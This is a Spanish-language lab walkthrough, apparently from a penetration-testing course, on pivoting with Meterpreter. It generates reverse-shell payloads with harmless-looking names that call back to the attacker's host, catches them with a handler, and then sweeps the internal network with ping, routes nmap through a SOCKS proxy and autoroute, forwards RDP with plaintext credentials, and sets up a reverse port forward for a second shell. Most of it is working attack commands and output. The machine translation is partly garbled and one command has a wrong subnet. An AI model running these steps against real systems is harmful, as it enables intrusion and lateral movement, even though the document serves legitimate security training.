# Meterpreter Tunneling & Port Forwarding

Ahora consideremos un escenario en el que tenemos nuestro acceso de Shell Meterpreter en el servidor Ubuntu (el host de pivote), y queremos realizar escaneos de enumeración a través del host de pivote, pero nos gustaría aprovechar las comodidades que las sesiones de meterpreter nos traen. En tales casos, aún podemos crear un pivote con nuestra sesión de meterpreter sin confiar en el reenvío de puertos SSH. Podemos crear un shell meterpreter para el servidor Ubuntu con el comando a continuación, que devolverá un shell en nuestro host de ataque en el puerto`8080`.

### **Creación de carga útil para el host Ubuntu Pivot**

Túnel de meterpreter y reenvío de puertos

```
xnoxos@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob

```

Antes de copiar la carga útil, podemos comenzar un[múltiple/manejador](https://www.rapid7.com/db/modules/exploit/multi/handler/), también conocido como un manejador de carga útil genérico.

### **Configurar y iniciar el Multi/Handler**

Túnel de meterpreter y reenvío de puertos

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080

```

Podemos copiar el`backupjob`Archivo binario al host Ubuntu Pivot`over SSH`y ejecutarlo para obtener una sesión de meterpreter.

### **Ejecutando la carga útil en el host Pivot**

Túnel de meterpreter y reenvío de puertos

```
ubuntu@WebServer:~$ lsbackupjob
ubuntu@WebServer:~$ chmod +x backupjob ubuntu@WebServer:~$ ./backupjob
```

Necesitamos asegurarnos de que la sesión de meterpreter se establezca con éxito al ejecutar la carga útil.

### **Establecimiento de sesión de Meterpreter**

Túnel de meterpreter y reenvío de puertos

```
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu

```

Sabemos que el objetivo de Windows está en la red 172.16.5.0/23. Entonces, suponiendo que el firewall en el objetivo de Windows esté permitiendo las solicitudes de ICMP, queremos realizar un barrido de ping en esta red. Podemos hacerlo usando meterpreter con el`ping_sweep`Módulo, que generará el tráfico ICMP desde el host Ubuntu a la red`172.16.5.0/23`.

### **Barrido de ping**

Túnel de meterpreter y reenvío de puertos

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23

```

También podríamos realizar un barrido de ping usando un`for loop`Directamente en un host Pivot de destino que hacer ping a cualquier dispositivo en el rango de red que especifiquemos. Aquí hay dos útiles Ping Barry para Foir One-Finers que podríamos usar para hosts de pivote basados en Linux y basados en Windows.

### **Ping Sweet for Loop en los hosts de Pivot Linux**

Túnel de meterpreter y reenvío de puertos

```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

### **Barrido de ping para bucle usando CMD**

Túnel de meterpreter y reenvío de puertos

```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

```

### **Ping barrido usando PowerShell**

Túnel de meterpreter y reenvío de puertos

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```

Nota: Es posible que un barrido de ping no resulte en respuestas exitosas en el primer intento, especialmente cuando se comunica a través de las redes. Esto puede ser causado por el tiempo que tarda un host para construir su caché ARP. En estos casos, es bueno intentar nuestro barrido de ping al menos dos veces para garantizar que la memoria caché ARP se construya.

Podría haber escenarios en los que el firewall de un anfitrión bloquea el ping (ICMP), y el ping no nos dará respuestas exitosas. En estos casos, podemos realizar una exploración TCP en la red 172.16.5.0/23 con NMAP. En lugar de usar SSH para el reenvío de puertos, también podemos usar el módulo de enrutamiento posterior a la explotación de Metasploit`socks_proxy`Para configurar un proxy local en nuestro host de ataque. Configuraremos el proxy de calcetines para`SOCKS version 4a`. Esta configuración de calcetines iniciará un oyente en el puerto`9050`y enruta todo el tráfico recibido a través de nuestra sesión de meterpreter.

### **Configuración del proxy de calcetines de MSF**

Túnel de meterpreter y reenvío de puertos

```
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

```

### **Confirmar el servidor proxy se está ejecutando**

Túnel de meterpreter y reenvío de puertos

```
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

```

Después de iniciar el servidor de calcetines, configuraremos proxychains para enrutar el tráfico generado por otras herramientas como NMAP a través de nuestro pivote en el host Ubuntu comprometido. Podemos agregar la línea a continuación al final de nuestro`proxychains.conf`archivo ubicado en`/etc/proxychains.conf`Si aún no está allí.

### **Agregar una línea a proxychains.conf si es necesario**

Túnel de meterpreter y reenvío de puertos

```
socks4 	127.0.0.1 9050

```

Nota: Dependiendo de la versión que el servidor de calcetines esté ejecutando, ocasionalmente es posible que necesitemos cambiar los calcetines4 a los calcetines5 en proxychains.conf.

Finalmente, debemos decirle a nuestro módulo Socks_Proxy que enrutará todo el tráfico a través de nuestra sesión de meterpreter. Podemos usar el`post/multi/manage/autoroute`Módulo de Metasploit para agregar rutas para la subred 172.16.5.0 y luego enrutar todo nuestro tráfico proxychains.

### **Creación de rutas con AutoRoute**

Túnel de meterpreter y reenvío de puertos

```
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed

```

También es posible agregar rutas con AutoRoute ejecutando Autoroute desde la sesión de Meterpreter.

Túnel de meterpreter y reenvío de puertos

```
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes

```

Después de agregar las rutas necesarias, podemos usar el`-p`Opción para enumerar las rutas activas para asegurarse de que nuestra configuración se aplique como se esperaba.

### **Listado de rutas activas con AutoRoute**

Túnel de meterpreter y reenvío de puertos

```
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1

```

Como puede ver en la salida anterior, la ruta se ha agregado a la red 172.16.5.0/23. Ahora podremos usar proxychains para enrutar nuestro tráfico NMAP a través de nuestra sesión de meterpreter.

### **Prueba de proxy y funcionalidad de enrutamiento**

Túnel de meterpreter y reenvío de puertos

```
xnoxos@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -PnProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

```

---

# **Reenvío de puertos**

El reenvío de puertos también se puede lograr utilizando Meterpreter`portfwd`módulo. Podemos habilitar un oyente en nuestro host de ataque y solicitar a Meterpreter para reenviar todos los paquetes recibidos en este puerto a través de nuestra sesión de Meterpreter a un host remoto en la red 172.16.5.0/23.

### **Opciones de portafa**

Túnel de meterpreter y reenvío de puertos

```
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.

```

### **Creación de relé tcp local**

Túnel de meterpreter y reenvío de puertos

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389

```

El comando anterior solicita a la sesión de meterpreter para iniciar un oyente en el puerto local de nuestro host de ataque (`-l`) `3300`y reenviar todos los paquetes al control remoto (`-r`) Servidor de Windows`172.16.5.19`en`3389`puerto (`-p`) a través de nuestra sesión de meterpreter. Ahora, si ejecutamos XFreerDP en nuestro localhost: 3300, podremos crear una sesión de escritorio remota.

### **Conectarse al objetivo de Windows a través de localhost**

Meterpreter Tunneling & Port Forwarding

```
xnoxos@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### **Salida de netstat**

Podemos usar NetStat para ver la información sobre la sesión que establecimos recientemente. Desde una perspectiva defensiva, podemos beneficiarnos del uso de NetStat si sospechamos que un anfitrión se ha visto comprometido. Esto nos permite ver las sesiones que ha establecido un anfitrión.

Túnel de meterpreter y reenvío de puertos

```
xnoxos@htb[/htb]$ netstat -antptcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp

```

---

# **Reenvío de puerto inverso de meterpreter**

Similar a los delanteros de puertos locales, MetaSploit también puede realizar`reverse port forwarding`Con el siguiente comando, donde es posible que desee escuchar en un puerto específico en el servidor comprometido y reenviar todos los shells entrantes del servidor Ubuntu a nuestro host de ataque. Iniciaremos un oyente en un nuevo puerto en nuestro host de ataque para Windows y solicitaremos que el servidor Ubuntu reenvíe todas las solicitudes recibidas al servidor Ubuntu en el puerto`1234`a nuestro oyente en el puerto`8081`.

Podemos crear un puerto inverso hacia adelante en nuestro shell existente desde el escenario anterior utilizando el siguiente comando. Este comando reenvía todas las conexiones en el puerto`1234`Ejecutando en el servidor Ubuntu a nuestro host de ataque en el puerto local (`-l`) `8081`. También configuraremos a nuestro oyente para escuchar en el puerto 8081 para un shell de Windows.

### **Reglas de reenvío de puertos inversos**

Túnel de meterpreter y reenvío de puertos

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234

```

### **Configuración y inicio de múltiples manejadores**

Túnel de meterpreter y reenvío de puertos

```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081

```

Ahora podemos crear una carga útil de Shell Inverse que devuelva una conexión a nuestro servidor Ubuntu en`172.16.5.129`:`1234`Cuando se ejecuta en nuestro host de Windows. Una vez que nuestro servidor Ubuntu reciba esta conexión, se reenviará a`attack host's ip`:`8081`que configuramos.

### **Generando la carga útil de Windows**

Túnel de meterpreter y reenvío de puertos

```
xnoxos@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe

```

Finalmente, si ejecutamos nuestra carga útil en el host de Windows, deberíamos poder recibir un shell de Windows girado a través del servidor Ubuntu.

### **Establecer la sesión de meterpreter**

Túnel de meterpreter y reenvío de puertos

```
[*] Started reverse TCP handler on 0.0.0.0:8081
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>

```

---

Nota: Al generar su objetivo, le pedimos que espere de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurada para que la conexión a su objetivo funcione sin problemas.